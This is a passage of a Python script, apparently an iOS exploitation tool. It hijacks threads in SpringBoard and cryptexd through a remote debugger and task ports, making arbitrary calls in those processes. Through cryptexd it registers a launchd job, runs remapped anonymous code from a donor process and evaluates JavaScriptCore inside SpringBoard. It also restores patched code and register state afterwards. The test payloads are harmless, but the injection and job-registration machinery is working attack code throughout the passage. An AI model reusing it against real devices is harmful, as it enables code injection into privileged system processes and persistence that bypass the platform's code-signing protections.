                                f"NSArray=0x{nsarray_bound:x} "
                                f"OSLaunchdJob=0x{oslaunchdjob_bound:x}"
                            )

                            dictionary = await remote_call(
                                "cryptexd_xpc_create_from_plist",
                                cryptexd_image_base
                                + CRYPTEXD_XPC_CREATE_FROM_PLIST_OFFSET,
                                (
                                    plist_address,
                                    len(launch_type1_plist.encode("utf-8")),
                                ),
                            )
                            if dictionary == 0:
                                raise ProtocolError(
                                    "xpc_create_from_plist returned null"
                                )

                            create_error = await remote_call(
                                "cryptexd_launchd_session_create_job",
                                cryptexd_image_base
                                + CRYPTEXD_LAUNCHD_SESSION_CREATE_JOB_OFFSET,
                                (
                                    dictionary,
                                    0,
                                    session_address,
                                    job_storage,
                                ),
                            )
                            job = struct.unpack(
                                "<Q",
                                await read_target(
                                    "cryptexd_job_object",
                                    job_storage,
                                    8,
                                ),
                            )[0]
                            if create_error != 0 or job == 0:
                                raise ProtocolError(
                                    "launchd_session_create_job failed: "
                                    f"error=0x{create_error:x} "
                                    f"job=0x{job:x}"
                                )
                            print(
                                "cryptexd-launchd-job-created "
                                f"object=0x{job:x}"
                            )

                            jobs = await remote_call(
                                "cryptexd_NSArray_arrayWithObjects_count",
                                cryptexd_image_base
                                + CRYPTEXD_NSARRAY_ONE_OBJECT_OFFSET,
                                (nsarray_bound, 0, job_storage, 1),
                            )
                            if jobs == 0:
                                raise ProtocolError(
                                    "NSArray job wrapper returned null"
                                )
                            await write_target(
                                "cryptexd_submit_error_zero",
                                job_storage + 8,
                                b"\0" * 8,
                            )
                            submit_result = await remote_call(
                                "cryptexd_OSLaunchdJob_submitAll_error",
                                cryptexd_image_base
                                + CRYPTEXD_SUBMIT_ALL_OFFSET,
                                (
                                    oslaunchdjob_bound,
                                    0,
                                    jobs,
                                    job_storage + 8,
                                ),
                            )
                            submit_error = struct.unpack(
                                "<Q",
                                await read_target(
                                    "cryptexd_submit_error",
                                    job_storage + 8,
                                    8,
                                ),
                            )[0]
                            if (
                                (submit_result & 0xFFFFFFFF) == 0
                                or submit_error != 0
                            ):
                                raise ProtocolError(
                                    "OSLaunchdJob submission failed: "
                                    f"result=0x{submit_result:x} "
                                    f"error=0x{submit_error:x}"
                                )
                            submission_complete = True
                            print(
                                "cryptexd-launch-type1-registration=success "
                                f"label={launch_type1_label} "
                                f"session={launch_type1_session} "
                                "launch-type=1 run-at-load=false "
                                "keep-alive=false started=false "
                                f"program={launch_type1_program}"
                            )
                        except BaseException as error:
                            submission_error = error
                            raise
                        finally:
                            lifetime_cleanup_errors: list[str] = []
                            if dictionary != 0:
                                try:
                                    await remote_call(
                                        "cryptexd_xpc_release_plist",
                                        cryptexd_image_base
                                        + CRYPTEXD_XPC_RELEASE_OFFSET,
                                        (dictionary,),
                                    )
                                    dictionary = 0
                                except BaseException as error:
                                    lifetime_cleanup_errors.append(
                                        f"xpc dictionary: {error}"
                                    )
                            if pool_token != 0:
                                try:
                                    await remote_call(
                                        "cryptexd_autoreleasePoolPop",
                                        cryptexd_image_base
                                        + CRYPTEXD_POOL_POP_OFFSET,
                                        (pool_token,),
                                    )
                                    pool_token = 0
                                except BaseException as error:
                                    lifetime_cleanup_errors.append(
                                        f"autorelease pool: {error}"
                                    )
                            if lifetime_cleanup_errors:
                                message = "; ".join(
                                    lifetime_cleanup_errors
                                )
                                if submission_error is None:
                                    raise ProtocolError(message)
                                print(
                                    "cryptexd-lifetime-cleanup-error="
                                    + message,
                                    file=sys.stderr,
                                )
                        if not submission_complete:
                            raise ProtocolError(
                                "cryptexd launch-type-1 submission incomplete"
                            )
                        print(
                            "ptrauth-loader-cryptexd-launch-type1-register="
                            f"success loader-pid={args.pid} "
                            f"target-pid={target_pid}"
                        )
                        return 0

                    if donor_mode:
                        # The donor probe is intentionally the first call on
                        # the validated native pthread after getpid.  A
                        # three-argument proc_pidpath diagnostic previously
                        # ran here first and could corrupt the saved pthread
                        # stack before the donor entry was ever reached,
                        # obscuring the executable-page trust result.
                        if donor_remap_address == 0:
                            raise ProtocolError(
                                "validated donor remap address is null"
                            )
                        donor_return = await remote_call(
                            "donor_return42",
                            donor_remap_address + DONOR_ENTRY_OFFSET,
                            (),
                        )
                        if donor_return != 42:
                            raise ProtocolError(
                                "remapped anonymous code returned "
                                f"{donor_return}, not 42"
                            )
                        print(
                            "springboard-donor-remap-execution=success "
                            "return=42 real-pthread=1"
                        )
                        print(
                            "ptrauth-loader-donor-remap-probe=success "
                            f"loader-pid={args.pid} "
                            f"target-pid={target_pid}"
                        )
                        return 0

                    stack_probe_text = "x" * 1023
                    stack_probe = await write_remote_string(
                        "stack_probe", stack_probe_text
                    )
                    remote_proc_pidpath = await resolve_image_symbol(
                        "libsystem_kernel",
                        "/usr/lib/system/libsystem_kernel.dylib",
                        "_proc_pidpath",
                    )
                    stack_probe_result = await remote_call(
                        "proc_pidpath_three_arguments",
                        remote_proc_pidpath,
                        (
                            target_pid,
                            stack_probe,
                            len(stack_probe_text) + 1,
                        ),
                    )
                    if stack_probe_result != len(SPRINGBOARD_PATH):
                        raise ProtocolError(
                            "three-argument remote-call stack probe failed: "
                            f"{stack_probe_result}"
                        )
                    print("springboard-three-argument-call=success")

                    framework_path = await write_remote_string(
                        "jsc_framework", JSC_FRAMEWORK_PATH
                    )
                    framework_handle = await remote_call(
                        "dlopen_JavaScriptCore",
                        dlopen_address,
                        (framework_path, RTLD_NOW_LOCAL),
                    )
                    if framework_handle == 0:
                        raise ProtocolError(
                            "SpringBoard dlopen returned a null JSC handle"
                        )

                    objc_get_class = await resolve_image_symbol(
                        "libobjc",
                        "/usr/lib/libobjc.A.dylib",
                        "_objc_getClass",
                    )
                    sel_register_name = await resolve_image_symbol(
                        "libobjc",
                        "/usr/lib/libobjc.A.dylib",
                        "_sel_registerName",
                    )
                    objc_msg_send_name = await write_remote_string(
                        "objc_msgSend_symbol", "objc_msgSend"
                    )
                    objc_msg_send = await remote_call(
                        "dlsym_objc_msgSend",
                        dlsym_address,
                        (framework_handle, objc_msg_send_name),
                    )
                    if objc_msg_send == 0:
                        raise ProtocolError(
                            "SpringBoard dlsym returned null for objc_msgSend"
                        )
                    print(
                        f"jsc-objc-symbols getClass=0x{objc_get_class:x} "
                        f"selRegister=0x{sel_register_name:x} "
                        f"msgSend=0x{objc_msg_send:x}"
                    )

                    remote_strings: dict[str, int] = {}
                    for label, value in (
                        ("js_context_class", "JSContext"),
                        ("ns_string_class", "NSString"),
                        ("alloc_selector", "alloc"),
                        ("init_selector", "init"),
                        (
                            "string_selector",
                            "stringWithUTF8String:",
                        ),
                        ("evaluate_selector", "evaluateScript:"),
                        ("to_int32_selector", "toInt32"),
                        ("script_text", "40 + 2"),
                    ):
                        remote_strings[label] = await write_remote_string(
                            label, value
                        )

                    js_context_class = await remote_call(
                        "objc_getClass_JSContext",
                        objc_get_class,
                        (remote_strings["js_context_class"],),
                    )
                    ns_string_class = await remote_call(
                        "objc_getClass_NSString",
                        objc_get_class,
                        (remote_strings["ns_string_class"],),
                    )
                    selectors: dict[str, int] = {}
                    for label in (
                        "alloc_selector",
                        "init_selector",
                        "string_selector",
                        "evaluate_selector",
                        "to_int32_selector",
                    ):
                        selectors[label] = await remote_call(
                            "sel_registerName_" + label,
                            sel_register_name,
                            (remote_strings[label],),
                        )
                    if (
                        js_context_class == 0
                        or ns_string_class == 0
                        or any(value == 0 for value in selectors.values())
                    ):
                        raise ProtocolError(
                            "JSC Objective-C classes or selectors are null"
                        )

                    context_allocation = await remote_call(
                        "JSContext_alloc",
                        objc_msg_send,
                        (
                            js_context_class,
                            selectors["alloc_selector"],
                        ),
                    )
                    context = await remote_call(
                        "JSContext_init",
                        objc_msg_send,
                        (
                            context_allocation,
                            selectors["init_selector"],
                        ),
                    )
                    script = await remote_call(
                        "NSString_stringWithUTF8String",
                        objc_msg_send,
                        (
                            ns_string_class,
                            selectors["string_selector"],
                            remote_strings["script_text"],
                        ),
                    )
                    script_value = await remote_call(
                        "JSContext_evaluateScript",
                        objc_msg_send,
                        (
                            context,
                            selectors["evaluate_selector"],
                            script,
                        ),
                    )
                    integer = await remote_call(
                        "JSValue_toInt32",
                        objc_msg_send,
                        (
                            script_value,
                            selectors["to_int32_selector"],
                        ),
                    )
                    if (integer & 0xFFFFFFFF) != 42:
                        raise ProtocolError(
                            f"SpringBoard JSC returned {integer}, not 42"
                        )
                    print(
                        "springboard-jsc-evaluation=success expression="
                        "'40 + 2' result=42"
                    )
            except BaseException as error:
                probe_error = error
                raise
            finally:
                probe_cleanup_errors: list[str] = []
                if stopped and target_task != 0 and remote_allocations:
                    for address, size, label in reversed(remote_allocations):
                        try:
                            deallocate_result = await call_loader(
                                "mach_vm_deallocate_" + label,
                                image_base
                                + MACH_VM_DEALLOCATE_STUB_OFFSET,
                                (target_task, address, size),
                            )
                            if deallocate_result & 0xFFFFFFFF:
                                raise ProtocolError(
                                    f"mach_vm_deallocate returned "
                                    f"{deallocate_result & 0xFFFFFFFF}"
                                )
                        except BaseException as error:
                            probe_cleanup_errors.append(
                                f"remote allocation {label}: {error}"
                            )
                    remote_allocations.clear()
                if (
                    stopped
                    and target_task != 0
                    and jsc_pthread_handle != 0
                    and jsc_worker_thread != 0
                    and pthread_exit_address != 0
                    and pthread_join_address != 0
                    and remote_thread != 0
                ):
                    try:
                        exit_result = await call_loader(
                            "arbCall_pthread_exit_jsc_worker",
                            image_base + ARB_CALL_OFFSET,
                            (
                                target_task,
                                jsc_worker_thread,
                                call_return_address,
                                0,
                                pthread_exit_address,
                                1,
                                0,
                            ),
                            variadic_stack_start=6,
                        )
                        print(
                            "jsc-worker-pthread-exit=observed "
                            f"wait-result={exit_result & 0xFFFFFFFF}"
                        )
                        call_thread = remote_thread
                        join_result = await remote_call(
                            "pthread_join_jsc_worker",
                            pthread_join_address,
                            (jsc_pthread_handle, 0),
                        )
                        if (join_result & 0xFFFFFFFF) != 0:
                            raise ProtocolError(
                                "pthread_join returned "
                                f"{join_result & 0xFFFFFFFF}"
                            )
                        print("jsc-worker-pthread-cleanup=success")
                        jsc_pthread_handle = 0
                        jsc_worker_thread = 0
                    except BaseException as error:
                        probe_cleanup_errors.append(
                            f"JSC pthread: {error}"
                        )
                if stopped and remote_thread != 0:
                    if not remote_thread_owned:
                        # task_threads returned the send rights and OOL array
                        # to this short-lived helper.  Do not terminate a real
                        # SpringBoard thread; helper exit releases those Mach
                        # resources after arbCall has restored its state.
                        print(
                            "borrowed-thread-cleanup=state-restored-by-arbcall"
                        )
                        remote_thread = 0
                if stopped and remote_thread != 0:
                    try:
                        state_address = scratch + THREAD_STATE_OFFSET
                        state_count_address = (
                            scratch + THREAD_STATE_COUNT_OFFSET
                        )
                        await write_memory(
                            remote,
                            state_address,
                            b"\0" * (ARM_THREAD_STATE64_COUNT * 4),
                        )
                        await write_memory(
                            remote,
                            state_count_address,
                            struct.pack("<I", ARM_THREAD_STATE64_COUNT),
                        )
                        state_result = await call_loader(
                            "thread_get_state_remote_cleanup",
                            image_base + THREAD_GET_STATE_STUB_OFFSET,
                            (
                                remote_thread,
                                ARM_THREAD_STATE64,
                                state_address,
                                state_count_address,
                            ),
                        )
                        remote_stack = 0
                        if (state_result & 0xFFFFFFFF) == 0:
                            remote_sp_raw = struct.unpack(
                                "<Q",
                                await read_memory(
                                    remote,
                                    state_address
                                    + ARM_THREAD_STATE64_SP_OFFSET,
                                    8,
                                ),
                            )[0]
                            remote_sp = remote_sp_raw & USER_VA_MASK
                            candidate_stack = (
                                remote_sp - REMOTE_THREAD_STACK_SIZE // 2
                            )
                            if (
                                remote_sp >= REMOTE_THREAD_STACK_SIZE // 2
                                and candidate_stack & 0x3FFF == 0
                            ):
                                remote_stack = candidate_stack
                        terminate_result = await call_loader(
                            "thread_terminate_remote",
                            image_base + THREAD_TERMINATE_STUB_OFFSET,
                            (remote_thread,),
                        )
                        if terminate_result & 0xFFFFFFFF:
                            raise ProtocolError(
                                "thread_terminate failed: "
                                f"{terminate_result & 0xFFFFFFFF}"
                            )
                        port_result = await call_loader(
                            "mach_port_deallocate_remote_thread",
                            image_base
                            + MACH_PORT_DEALLOCATE_STUB_OFFSET,
                            (task_self, remote_thread),
                        )
                        if port_result & 0xFFFFFFFF:
                            raise ProtocolError(
                                "remote thread port deallocation failed: "
                                f"{port_result & 0xFFFFFFFF}"
                            )
                        if remote_stack != 0:
                            stack_result = await call_loader(
                                "mach_vm_deallocate_remote_thread_stack",
                                image_base
                                + MACH_VM_DEALLOCATE_STUB_OFFSET,
                                (
                                    target_task,
                                    remote_stack,
                                    REMOTE_THREAD_STACK_SIZE,
                                ),
                            )
                            if stack_result & 0xFFFFFFFF:
                                raise ProtocolError(
                                    "remote thread stack deallocation "
                                    f"failed: {stack_result & 0xFFFFFFFF}"
                                )
                        remote_thread = 0
                    except BaseException as error:
                        probe_cleanup_errors.append(
                            f"remote thread: {error}"
                        )
                if stopped and donor_task != 0:
                    try:
                        donor_port_result = await call_loader(
                            "mach_port_deallocate_donor_task",
                            image_base + MACH_PORT_DEALLOCATE_STUB_OFFSET,
                            (task_self, donor_task),
                        )
                        if donor_port_result & 0xFFFFFFFF:
                            raise ProtocolError(
                                "donor task port deallocation failed: "
                                f"{donor_port_result & 0xFFFFFFFF}"
                            )
                        donor_task = 0
                    except BaseException as error:
                        probe_cleanup_errors.append(
                            f"donor task: {error}"
                        )
                if stopped and donor_validated:
                    try:
                        donor_kill_result_raw = await call_loader(
                            "kill_owned_donor_child",
                            image_base + KILL_STUB_OFFSET,
                            (args.donor_pid, SIGKILL),
                        )
                        donor_kill_result = struct.unpack(
                            "<i",
                            struct.pack(
                                "<I",
                                donor_kill_result_raw & 0xFFFFFFFF,
                            ),
                        )[0]
                        if donor_kill_result != 0:
                            raise ProtocolError(
                                "owned donor child termination failed: "
                                f"{donor_kill_result}"
                            )
                        donor_validated = False
                        print(
                            "donor-remap-owned-child-terminated "
                            f"pid={args.donor_pid}"
                        )
                    except BaseException as error:
                        probe_cleanup_errors.append(
                            f"donor termination: {error}"
                        )
                if stopped and target_task != 0:
                    try:
                        port_result = await call_loader(
                            "mach_port_deallocate_target_task",
                            image_base
                            + MACH_PORT_DEALLOCATE_STUB_OFFSET,
                            (task_self, target_task),
                        )
                        if port_result & 0xFFFFFFFF:
                            raise ProtocolError(
                                "target task port deallocation failed: "
                                f"{port_result & 0xFFFFFFFF}"
                            )
                        target_task = 0
                    except BaseException as error:
                        probe_cleanup_errors.append(
                            f"target task: {error}"
                        )
                if probe_cleanup_errors:
                    message = "; ".join(probe_cleanup_errors)
                    print(
                        f"thread-probe-cleanup-error={message}",
                        file=sys.stderr,
                    )
                    if probe_error is None:
                        raise ProtocolError(message)
            mode_name = (
                "amfid-policy-probe"
                if amfid_mode
                else (
                    "jsc-probe"
                    if args.jsc_probe is not None
                    else (
                        "donor-remap-probe"
                        if donor_mode
                        else "thread-probe"
                    )
                )
            )
            print(
                f"ptrauth-loader-{mode_name}=success loader-pid="
                f"{args.pid} target-pid={target_pid}"
            )
            return 0
        except BaseException as error:
            primary_error = error
            raise
        finally:
            cleanup_errors: list[str] = []
            if attached and not stopped:
                try:
                    response = await remote.interrupt()
                    stopped = response[:1] in {"T", "S"}
                    print(f"cleanup-interrupt={response}")
                except BaseException as error:
                    cleanup_errors.append(f"interrupt: {error}")
            if attached and stopped:
                if live_code_patch_originals:
                    try:
                        for offset, original in reversed(
                            tuple(live_code_patch_originals.items())
                        ):
                            address = image_base + offset
                            await write_memory(remote, address, original)
                            verified = await read_memory(remote, address, 4)
                            if verified != original:
                                raise ProtocolError(
                                    "live code patch restore failed at "
                                    f"offset 0x{offset:x}: {verified.hex()}"
                                )
                        live_code_patch_originals.clear()
                        print("cleanup-arbcall-thread-quiesce=restored")
                    except BaseException as error:
                        cleanup_errors.append(f"live code restore: {error}")
                if (
                    main_stack_pointer is not None
                    and main_stack_backup is not None
                ):
                    try:
                        await write_memory(
                            remote,
                            main_stack_pointer,
                            main_stack_backup,
                        )
                        main_stack_backup = None
                        print("cleanup-main-stack=restored")
                    except BaseException as error:
                        cleanup_errors.append(f"main stack restore: {error}")
                if state_saved and save_identifier is not None:
                    try:
                        await expect_ok(
                            remote,
                            f"QRestoreRegisterState:{save_identifier};"
                            f"thread:{state.thread};",
                        )
                        state_saved = False
                        print("cleanup-register-state=restored")
                    except BaseException as error:
                        cleanup_errors.append(f"register restore: {error}")
                if breakpoint_address is not None:
                    try:
                        await expect_ok(
                            remote, f"z1,{breakpoint_address:x},4"
                        )
                        breakpoint_address = None
                        print("cleanup-breakpoint=removed")
                    except BaseException as error:
                        cleanup_errors.append(f"breakpoint: {error}")
                if scratch is not None:
                    try:
                        await expect_ok(remote, f"_m{scratch:x}")
                        scratch = None
                        print("cleanup-scratch=deallocated")
                    except BaseException as error:
                        cleanup_errors.append(
                            f"scratch deallocation: {error}"
                        )
                try:
                    await expect_ok(remote, "D")
                    attached = False
                    print("cleanup-detach=success")
                except BaseException as error:
                    cleanup_errors.append(f"detach: {error}")
            try:
                await connection.close()
            except BaseException as error:
                cleanup_errors.append(f"connection close: {error}")
            if cleanup_errors:
                message = "; ".join(cleanup_errors)
                print(f"cleanup-error={message}", file=sys.stderr)
                if primary_error is None:
                    raise ProtocolError(message)


def main() -> int:
    args = parse_args()
    try:
        return asyncio.run(run(args))
    except Exception as error:
        print(f"error: {error}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
